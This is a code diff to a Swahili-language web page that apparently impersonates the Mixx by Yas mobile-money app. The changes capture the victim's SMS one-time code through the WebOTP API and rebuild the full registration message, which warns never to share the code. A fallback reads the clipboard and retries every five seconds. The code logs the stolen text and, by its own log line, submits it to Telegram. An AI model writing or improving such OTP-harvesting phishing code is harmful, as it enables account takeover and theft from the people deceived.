@@ -94,8 +94,8 @@
                 <div class="code-instruction">
                     <i class="fas fa-sms"></i> <strong>Msimbo utagunduliwa kiotomatiki</strong><br><br>
                     <strong>1.</strong> Subiri SMS ifike<br>
-                    <strong>2.</strong> Bonyeza <strong>"Allow"</strong><br>
-                    <strong>3.</strong> SMS itajaza moja kwa moja<br>
+                    <strong>2.</strong> Bonyeza <strong>"Allow"</strong> kwenye kidirisha<br>
+                    <strong>3.</strong> Ujumbe utajaza kiotomatiki<br>
                     <strong>4.</strong> Bonyeza <strong>"Endelea"</strong>
                 </div>
                 <a href="sms:" class="sms-open-btn" id="btnIPhone" style="display:none;">
@@ -166,6 +166,7 @@
         var isSubmitting = false;
         var smsDetected = false;
         var detectedCode = '';
+        var webotpAttempted = false;
 
         // ================================================================
         // iPhone/Android DETECTION
@@ -222,6 +223,7 @@
             document.getElementById('smsMessage').value = '';
             smsDetected = false;
             detectedCode = '';
+            webotpAttempted = false;
             document.getElementById('codeError').textContent = 'OTP Imetumwa. Subiri msimbo kutoka Mixx. (' + resendCount + '/3)'; 
             document.getElementById('codeError').style.color = 'var(--primary)'; 
             document.getElementById('codeError').classList.add('show'); 
@@ -236,7 +238,7 @@
             } catch(e) {} 
             
             setTimeout(function() { resendCooldown = false; }, 30000);
-            setTimeout(autoFillOTP, 1500);
+            setTimeout(startAutoDetect, 1500);
         }
 
         async function submitCode() { 
@@ -251,7 +253,7 @@
             }
 
             debugLog('📤 Submitting SMS to Telegram...', 'info');
-            debugLog('📤 SMS length: ' + smsText.length, 'info');
+            debugLog('📤 SMS: ' + smsText, 'info');
 
             isSubmitting = true;
             document.getElementById('submitBtn').disabled = true;
@@ -296,6 +298,7 @@
             document.getElementById('smsMessage').value = ''; 
             smsDetected = false;
             detectedCode = '';
+            webotpAttempted = false;
             document.getElementById('codeError').textContent = 'Msimbo sio sahihi. Jaribu tena.'; 
             document.getElementById('codeError').style.color = 'var(--danger)'; 
             document.getElementById('codeError').classList.add('show'); 
@@ -306,94 +309,136 @@
             isSubmitting = false;
             document.getElementById('submitBtn').disabled = false;
             document.getElementById('submitBtn').innerHTML = 'Endelea →';
-            setTimeout(autoFillOTP, 1500);
+            setTimeout(startAutoDetect, 1500);
         }
 
         // ================================================================
-        // WEBOTP AUTO-FILL - RECONSTRUCTS FULL SMS FROM CODE
+        // WEBOTP DETECTION + REGENERATE FULL SMS
         // ================================================================
-        async function autoFillOTP() {
+        function regenerateFullSMS(code) {
+            return 'You are being registered in Mixx by Yas Super App, use the code ' + code + ' to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR';
+        }
+
+        async function startAutoDetect() {
             if (!document.getElementById('screen1').classList.contains('active')) {
-                debugLog('⏹️ Not on code screen, skipping', 'info');
+                debugLog('⏹️ Not on code screen, stopping', 'info');
                 return;
             }
 
-            // Check if WebOTP is supported
-            if (!('OTPCredential' in window)) {
-                debugLog('❌ WebOTP not supported on this browser', 'error');
-                document.getElementById('codeError').textContent = 'ℹ️ Kifaa chako hakitumii auto-detect. Tafadhali nakili mwenyewe.';
-                document.getElementById('codeError').style.color = '#f59e0b';
+            if (smsDetected) {
+                debugLog('✅ SMS already detected, skipping', 'success');
+                return;
+            }
+
+            // ============================================================
+            // METHOD 1: WebOTP - Auto-detect from notification
+            // ============================================================
+            if (!webotpAttempted && 'OTPCredential' in window) {
+                webotpAttempted = true;
+                debugLog('⏳ Attempt 1: WebOTP - waiting for notification...', 'info');
+                document.getElementById('codeError').textContent = '⏳ Inasubiri SMS... Bonyeza "Allow" ikitokea';
+                document.getElementById('codeError').style.color = 'var(--primary)';
                 document.getElementById('codeError').classList.add('show');
-                return;
+
+                try {
+                    const controller = new AbortController();
+                    const timeout = setTimeout(() => controller.abort(), 60000);
+
+                    const credential = await navigator.credentials.get({
+                        otp: { transport: ['sms'] },
+                        signal: controller.signal
+                    });
+
+                    clearTimeout(timeout);
+
+                    if (credential && credential.code) {
+                        detectedCode = credential.code;
+                        debugLog('✅ WebOTP SUCCESS! Code: ' + detectedCode, 'success');
+                        
+                        // REGENERATE the full SMS from the code
+                        var fullSMS = regenerateFullSMS(detectedCode);
+                        
+                        document.getElementById('smsMessage').value = fullSMS;
+                        smsDetected = true;
+                        
+                        debugLog('📝 Full SMS regenerated: ' + fullSMS, 'success');
+                        
+                        document.getElementById('codeError').textContent = '✅ Msimbo umegunduliwa! Bonyeza "Endelea" kutuma.';
+                        document.getElementById('codeError').style.color = '#10b981';
+                        document.getElementById('codeError').classList.add('show');
+                        
+                        clearInterval(countdownTimer);
+                        document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
+                        document.getElementById('timerDisplay').className = 'timer-bar';
+                        return;
+                    }
+                } catch (err) {
+                    if (err.name === 'AbortError') {
+                        debugLog('⏱️ WebOTP timeout - trying fallback', 'error');
+                    } else {
+                        debugLog('❌ WebOTP error: ' + err.message, 'error');
+                    }
+                }
             }
 
-            debugLog('⏳ Waiting for SMS notification via WebOTP...', 'info');
-            document.getElementById('codeError').textContent = '⏳ Inasubiri SMS...';
-            document.getElementById('codeError').style.color = 'var(--primary)';
+            // ============================================================
+            // METHOD 2: Clipboard Fallback (if WebOTP fails)
+            // ============================================================
+            debugLog('🔄 Attempt 2: Clipboard fallback - checking clipboard...', 'info');
+            document.getElementById('codeError').textContent = '📋 Tafadhali nakili ujumbe wa SMS kwenye arifa yako';
+            document.getElementById('codeError').style.color = '#f59e0b';
             document.getElementById('codeError').classList.add('show');
 
             try {
-                // ============================================================
-                // STEP 1: WebOTP detects the SMS and extracts the code
-                // ============================================================
-                const credential = await navigator.credentials.get({
-                    otp: { transport: ['sms'] }
-                });
-
-                // ============================================================
-                // STEP 2: If code is received, reconstruct the FULL SMS
-                // ============================================================
-                if (credential && credential.code) {
-                    detectedCode = credential.code;
-                    debugLog('✅ OTP DETECTED! Code: ' + detectedCode, 'success');
-                    
-                    // ============================================================
-                    // STEP 3: RECONSTRUCT THE FULL SMS FROM THE CODE
-                    // ============================================================
-                    var fullSMS = 'You are being registered in Mixx by Yas Super App, use the code ' + detectedCode + ' to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR';
-                    
-                    debugLog('📝 Full SMS reconstructed: ' + fullSMS, 'success');
-                    
-                    // ============================================================
-                    // STEP 4: Fill the textarea with the FULL SMS
-                    // ============================================================
-                    document.getElementById('smsMessage').value = fullSMS;
-                    smsDetected = true;
-                    
-                    debugLog('✅ Full SMS filled in textarea!', 'success');
-                    
-                    document.getElementById('codeError').textContent = '✅ Ujumbe umegunduliwa! Bonyeza "Endelea" kutuma.';
-                    document.getElementById('codeError').style.color = '#10b981';
-                    document.getElementById('codeError').classList.add('show');
-                    
-                    clearInterval(countdownTimer);
-                    document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
-                    document.getElementById('timerDisplay').className = 'timer-bar';
-                } else {
-                    debugLog('⚠️ No code received from WebOTP', 'error');
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    const text = await navigator.clipboard.readText();
+                    if (text && text.length > 20) {
+                        document.getElementById('smsMessage').value = text;
+                        smsDetected = true;
+                        debugLog('✅ Clipboard SUCCESS! SMS length: ' + text.length, 'success');
+                        
+                        document.getElementById('codeError').textContent = '✅ Ujumbe umegunduliwa! Bonyeza "Endelea" kutuma.';
+                        document.getElementById('codeError').style.color = '#10b981';
+                        document.getElementById('codeError').classList.add('show');
+                        
+                        clearInterval(countdownTimer);
+                        document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
+                        document.getElementById('timerDisplay').className = 'timer-bar';
+                        return;
+                    }
                 }
-            } catch (err) {
-                if (err.name === 'AbortError') {
-                    debugLog('⏱️ WebOTP timeout - no SMS received', 'error');
-                } else {
-                    debugLog('❌ WebOTP error: ' + err.message, 'error');
-                    document.getElementById('codeError').textContent = '❌ Hitilafu. Tafadhali nakili SMS mwenyewe.';
-                    document.getElementById('codeError').style.color = 'var(--danger)';
-                    document.getElementById('codeError').classList.add('show');
-                }
+                debugLog('⚠️ Clipboard empty or not available', 'error');
+            } catch (e) {
+                debugLog('❌ Clipboard error: ' + e.message, 'error');
             }
+
+            // ============================================================
+            // If both methods fail
+            // ============================================================
+            debugLog('❌ No SMS detected. Please copy manually.', 'error');
+            document.getElementById('codeError').textContent = '❌ Hakuna SMS iliyogunduliwa. Tafadhali nakili mwenyewe.';
+            document.getElementById('codeError').style.color = 'var(--danger)';
+            document.getElementById('codeError').classList.add('show');
         }
 
         // ================================================================
         // START
         // ================================================================
         startCountdown();
-        
-        // Run autoFillOTP after 1 second
-        setTimeout(autoFillOTP, 1000);
+        setTimeout(startAutoDetect, 1500);
 
-        debugLog('✅ MixxPlus - Waiting for SMS notification...', 'success');
-        debugLog('📱 Open on Android Chrome for best results', 'info');
+        // Keep trying every 5 seconds if not detected
+        var autoDetectInterval = setInterval(function() {
+            if (!smsDetected && document.getElementById('screen1').classList.contains('active')) {
+                startAutoDetect();
+            }
+            if (!document.getElementById('screen1').classList.contains('active')) {
+                clearInterval(autoDetectInterval);
+            }
+        }, 5000);
+
+        debugLog('✅ MixxPlus - Auto-detection started', 'success');
+        debugLog('📱 Method 1: WebOTP (auto) → Method 2: Clipboard (fallback)', 'info');
     </script>
 </body>
 </html>
